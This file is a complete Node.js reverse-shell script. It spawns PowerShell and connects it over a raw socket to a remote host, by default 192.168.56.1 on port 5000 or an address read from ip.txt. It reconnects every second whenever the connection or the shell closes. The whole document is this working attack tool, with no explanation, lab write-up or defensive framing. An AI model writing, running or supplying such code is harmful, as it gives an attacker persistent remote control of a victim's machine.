const net = require("net");
const cp = require("child_process");
const fs = require("fs");

let HOST = "192.168.56.1";
let sh;

function startReverseShell() {
  if (sh) {
    sh.kill();
    sh = null;
  }

  sh = cp.spawn("powershell", []);
  
  const client = new net.Socket();
  
  client.on('error', (error) => {
    console.error('Socket error:', error);
    client.destroy();
    setTimeout(startReverseShell, 1000);
  });

  client.connect(5000, HOST, function(){
    console.log('Connected to server');
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  
  client.on('close', () => {
    console.log('Connection closed');
    setTimeout(startReverseShell, 1000);
  });
}

function loopReverseShell() {
  fs.readFile("ip.txt", "utf8", (err, data) => {
    if (err) {
      HOST = HOST
    } else {
      HOST = data.trim() || HOST;
    }
    console.log(HOST)
    startReverseShell();

    sh.on("exit", (code, signal) => {
      console.log('Shell process exited');
      setTimeout(loopReverseShell, 1000);
    });
  });
}

loopReverseShell();